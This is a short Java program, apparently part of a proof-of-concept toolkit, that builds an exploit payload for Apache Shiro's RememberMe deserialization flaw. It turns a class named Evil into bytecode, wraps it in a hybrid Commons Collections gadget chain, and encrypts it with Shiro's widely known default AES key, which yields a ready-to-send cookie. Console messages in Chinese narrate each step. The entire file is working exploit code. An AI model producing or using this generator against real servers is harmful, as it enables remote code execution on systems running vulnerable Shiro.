package POC_macker.CCShiro;

import POC_macker.CBShiro.Evil;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;


public class Get_poc {

    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());

        System.out.println("Evil恶意类数据流已获取，开始构造CC6+CC1+CC3的杂合链:");
        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());


        System.out.println(payloads.length);
        System.out.println("CC6+CC1+CC3的杂合链构造完成，开始加密数据。。。。。");

        String poc = encrypt(payloads,"kPH+bIxk5D2deZiIxcaaaA==");
        System.out.println(poc);
    }

    public static String encrypt(byte[] plaintext, String _key){
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode(_key);
        ByteSource ciphertext = aes.encrypt(plaintext, key);
        return ciphertext.toString();
    }
}

